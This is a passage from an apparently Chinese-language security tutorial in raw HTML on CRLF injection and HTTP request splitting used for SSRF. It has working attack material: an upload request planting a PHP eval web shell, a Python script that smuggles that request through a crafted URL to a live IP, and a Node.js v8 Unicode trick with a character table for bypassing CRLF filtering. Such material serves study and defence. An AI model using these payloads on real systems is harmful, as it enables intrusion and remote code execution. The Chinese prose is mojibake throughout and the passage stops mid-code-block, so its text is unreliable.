<li>åœºæ™¯ä¸€ï¼Œç›®æ ‡ä¸»æœºå­˜åœ¨SSRFæ¼æ´ï¼Œä¸”å­˜åœ¨ä¸Šä¼ æ¼æ´ï¼Œä½†æ˜¯ä¸Šä¼ ç‚¹é™åˆ¶äº†åªå…è®¸æœ¬æœºè¿›è¡Œä¸Šä¼ ã€‚<br>å®Œæ•´çš„ä¸Šä¼ è¯·æ±‚å¦‚ä¸‹ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br></pre></td></tr></table></figure>
ç¼–å†™è„šæœ¬æ„é€ payloadï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 435</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[whoami]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\\r\\n&quot;)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">#è¾“å‡º: HTTP&#x2F;1.1\r\n\r\nPOST &#x2F;upload.php HTTP&#x2F;1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36\r\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q&#x3D;0.9\r\nCookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;\r\nContent-Type: application&#x2F;octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET &#x2F; HTTP&#x2F;1.1\r\ntest:</span><br></pre></td></tr></table></figure>
æ„é€ å®Œæ•´çš„è¯·æ±‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import urllib</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.error</span><br><span class="line"></span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000?a&#x3D;1 HTTP&#x2F;1.1\r\n\r\nPOST &#x2F;upload.php HTTP&#x2F;1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36\r\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q&#x3D;0.9\r\nCookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;\r\nContent-Type: application&#x2F;octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET &#x2F; HTTP&#x2F;1.1\r\ntest:&#39;</span><br><span class="line">#?a&#x3D;1 åé¢çš„é‚£ä¸ªHTTP&#x2F;1.1æ˜¯ä¸ºäº†é—­åˆæ­£å¸¸çš„HTTPçŠ¶æ€è¡Œ</span><br><span class="line">try:</span><br><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
å¦‚æ­¤ç›®æ ‡ä¸»æœºå°±æˆåŠŸçš„å‘æœ¬åœ°ä¸Šä¼ åŠŸèƒ½å‘é€äº†ä¸€ä¸ªä¸Šä¼ è¯·æ±‚<br><img src="/images/pasted-41.png" alt="upload successful"></li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>4. <font color=#ff4500>NodeJS ä¸­çš„ CRLF Injection</font></strong></p>
<ul>
<li>èƒŒæ™¯<br>2018 å¹´æœ‰ç ”ç©¶è€…å‘ç°ï¼Œå½“Node.jsä½¿ç”¨ http.get å‘ç‰¹å®šè·¯å¾„å‘å‡ºHTTPè¯·æ±‚æ—¶ï¼Œå‘å‡ºçš„è¯·æ±‚å®é™…ä¸Šè¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„ï¼<br><img src="/images/pasted-42.png" alt="upload successful"><br>æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªé—®é¢˜æ˜¯ç”±Node.jså°†HTTPè¯·æ±‚å†™å…¥è·¯å¾„æ—¶ï¼Œå¯¹Unicodeå­—ç¬¦çš„æœ‰æŸç¼–ç å¼•èµ·çš„ã€‚</li>
<li><strong>HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå</strong><br>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„ HTTP è¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„Unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç å­—ç¬¦é›†ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼Œä¾‹å¦‚ğŸ¶è¿™ä¸ªè¡¨æƒ…ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬çš„è¯·æ±‚è·¯å¾„ä¸­å«æœ‰å¤šå­—èŠ‚ç¼–ç çš„Unicodeå­—ç¬¦æ—¶ï¼Œä¼šè¢«æˆªæ–­å–æœ€ä½å­—èŠ‚ï¼Œæ¯”å¦‚ \u0130 å°±ä¼šè¢«æˆªæ–­ä¸º \u30ï¼š<br><img src="/images/pasted-43.png" alt="upload successful"></li>
<li><strong>Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»</strong><br>åˆšæ‰æ¼”ç¤ºçš„é‚£ä¸ª HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸåçœ‹ä¼¼æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œä½†å®ƒå¯ä»¥åœ¨ nodejs çš„ HTTP æ‹†åˆ†æ”»å‡»ä¸­å¤§æ˜¾èº«æ‰‹ã€‚<br>ç”±äºnodejsçš„HTTPåº“åŒ…å«äº†é˜»æ­¢CRLFçš„æªæ–½ï¼Œå³å¦‚æœä½ å°è¯•å‘å‡ºä¸€ä¸ªURLè·¯å¾„ä¸­å«æœ‰å›è½¦ã€æ¢è¡Œæˆ–ç©ºæ ¼ç­‰æ§åˆ¶å­—ç¬¦çš„HTTPè¯·æ±‚æ˜¯ï¼Œå®ƒä»¬ä¼šè¢«URLç¼–ç ï¼Œæ‰€ä»¥æ­£å¸¸çš„CRLFæ³¨å…¥åœ¨nodejsä¸­å¹¶ä¸èƒ½åˆ©ç”¨ï¼š<br><font color=#FF0000>ä¾‹å¦‚ä½¿ç”¨æ­£å¸¸çš„CRLFæ³¨å…¥å¹¶ä¸èƒ½æˆåŠŸ</font><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; var http &#x3D; require(&quot;http&quot;);</span><br><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\r\n&#x2F;WHOAMI&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;%0D%0A&#x2F;WHOAMI HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
<img src="/images/pasted-44.png" alt="upload successful"><br>ä½†æ˜¯ä¸Šè¿°çš„å¤„ç†Unicodeå­—ç¬¦é”™è¯¯æ„å‘³ç€å¯ä»¥è§„é¿è¿™äº›ä¿æŠ¤æªæ–½ã€‚è€ƒè™‘å¦‚ä¸‹çš„URLï¼Œå…¶ä¸­åŒ…å«ä¸€äº›é«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u&#123;010D&#125;\u&#123;010A&#125;&#x2F;WHOAMI&#39;</span><br><span class="line">http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;ÄÄŠ&#x2F;WHOAMI</span><br></pre></td></tr></table></figure>
å½“ Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬å¯¹æ­¤URLå‘å‡º GET è¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u010D\u010A&#x2F;WHOAMI&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;ÄÄŠ&#x2F;WHOAMI HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
ä½†æ˜¯å½“ç»“æœå­—ç¬¦ä¸²è¢«ç¼–ç ä¸º latin1 å†™å…¥è·¯å¾„æ—¶ï¼Œè¿™äº›å­—ç¬¦å°†åˆ†åˆ«è¢«æˆªæ–­ä¸º â€œ\râ€ï¼ˆ%0dï¼‰å’Œ â€œ\nâ€ï¼ˆ%0aï¼‰ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Buffer.from(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u&#123;010D&#125;\u&#123;010A&#125;&#x2F;WHOAMI&#39;, &#39;latin1&#39;).toString()</span><br><span class="line">&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\r\n&#x2F;WHOAMI&#39;</span><br></pre></td></tr></table></figure>
<img src="/images/pasted-45.png" alt="upload successful"><br>å¯è§ï¼Œé€šè¿‡åœ¨è¯·æ±‚è·¯å¾„ä¸­åŒ…å«ç²¾å¿ƒé€‰æ‹©çš„Unicodeå­—ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥æ¬ºéª—Node.jså¹¶æˆåŠŸå®ç°CRLFæ³¨å…¥ã€‚<br>ä¸ä»…æ˜¯CRLFï¼Œæ‰€æœ‰çš„æ§åˆ¶å­—ç¬¦éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ„é€ å‡ºæ¥ã€‚ä¸‹é¢æ˜¯æˆ‘åˆ—ä¸¾å‡ºæ¥çš„è¡¨æ ¼ï¼Œç¬¬ä¸€åˆ—æ˜¯éœ€è¦æ„é€ çš„å­—ç¬¦ï¼Œç¬¬äºŒåˆ—æ˜¯å¯æ„é€ å‡ºç›¸åº”å­—ç¬¦çš„é«˜ç¼–å·çš„Unicodeç ï¼Œç¬¬ä¸‰åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦ï¼Œç¬¬å››åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦çš„URLç¼–ç ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦	å¯ç”±ä»¥ä¸‹Unicodeç¼–ç æ„é€ å‡º	Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦	Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦å¯¹åº”çš„URLç¼–ç </span><br><span class="line">å›è½¦ç¬¦ \r	   \u010d	   Ä	   %C4%8D</span><br><span class="line">æ¢è¡Œç¬¦ \n	   \u010a	   ÄŠ	   %C4%8A</span><br><span class="line">ç©ºæ ¼	          \u0120	    Ä 	   %C4%A0</span><br><span class="line">åæ–œæ  \	      \u0122	     Ä¢	   %C4%A2</span><br><span class="line">å•å¼•å· &#39;	       \u0127	      Ä§	   %C4%A7</span><br><span class="line">åå¼•å· &#96;	      \u0160	     Å 	   %C5%A0</span><br><span class="line">å¹å· !	       \u0121	    Ä¡	   %C4%A1</span><br></pre></td></tr></table></figure>
è¿™ä¸ªbugå·²ç»åœ¨Node.js10ä¸­è¢«ä¿®å¤ï¼Œå¦‚æœè¯·æ±‚è·¯å¾„åŒ…å«éAsciiå­—ç¬¦ï¼Œåˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚ä½†æ˜¯å¯¹äº Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰ä¸‹åˆ—æƒ…å†µï¼Œä»»ä½•å‘å‡ºHTTPè¯·æ±‚çš„æœåŠ¡å™¨éƒ½å¯èƒ½å—åˆ°é€šè¿‡è¯·æ±‚æ‹†å®ç°çš„SSRFçš„æ”»å‡»ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ¥å—æ¥è‡ªç”¨æˆ·è¾“å…¥çš„Unicodeæ•°æ®</span><br><span class="line">å¹¶å°†å…¶åŒ…å«åœ¨HTTPè¯·æ±‚çš„è·¯å¾„ä¸­</span><br><span class="line">ä¸”è¯·æ±‚å…·æœ‰ä¸€ä¸ª0é•¿åº¦çš„ä¸»ä½“ï¼ˆæ¯”å¦‚ä¸€ä¸ª GET æˆ–è€… DELETEï¼‰</span><br></pre></td></tr></table></figure></li>
<li><strong>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ</strong><br>  ç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥æ¶æ„çš„ HTTP é¦–éƒ¨å­—æ®µçš„è¯è¿˜éœ€è¦é—­åˆçŠ¶æ€è¡Œä¸­ HTTP/1.1 ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID&#x3D;whoami&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;Ä HTTP&#x2F;1.1ÄÄŠSet-Cookie:Ä PHPSESSID&#x3D;whoami HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
<img src="/images/pasted-46.png" alt="upload successful"><br>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ª Set-Cookie é¦–éƒ¨å­—æ®µï¼Œè™½ç„¶åé¢è¿˜æœ‰ä¸€ä¸ª HTTP/1.1 ï¼Œä½†æˆ‘ä»¬æ ¹æ®è¯¥åŸç†ä¾ç„¶å¯ä»¥å°†å…¶é—­åˆï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID&#x3D;whoami\u010D\u010Atest:&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;Ä HTTP&#x2F;1.1ÄÄŠSet-Cookie:Ä PHPSESSID&#x3D;whoamiÄÄŠtest: HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>
<img src="/images/pasted-47.png" alt="upload successful"><br>è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€  â€œä»»æ„â€ çš„HTTPè¯·æ±‚äº†ã€‚</li>
<li><strong>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚</strong><br>  é¦–å…ˆï¼Œç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥å®Œæ•´çš„ HTTP è¯·æ±‚çš„è¯éœ€è¦å…ˆé—­åˆçŠ¶æ€è¡Œä¸­ HTTP/1.1 ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œã€‚å…¶æ¬¡ä¸ºäº†ä¸è®©åŸæ¥çš„ HTTP/1.1 å½±å“æˆ‘ä»¬æ–°æ„é€ çš„è¯·æ±‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†æ„é€ ä¸€æ¬¡ GET / é—­åˆåŸæ¥çš„ HTTP è¯·æ±‚ã€‚<br>å‡è®¾ç›®æ ‡ä¸»æœºå­˜åœ¨SSRFï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°ä¸Šä¼ æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦å°è¯•æ„é€ å¦‚ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å®Œæ•´ POST è¯·æ±‚ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br></pre></td></tr></table></figure>
ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªPOSTè¯·æ±‚é‡Œé¢çš„æ‰€æœ‰çš„å­—ç¬¦åŒ…æ‹¬æ§åˆ¶ç¬¦å…¨éƒ¨ç”¨ä¸Šè¿°çš„é«˜ç¼–å·Unicodeç è¡¨ç¤ºï¼š<br>ç¨‹åºç¼–ç å®ç°ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 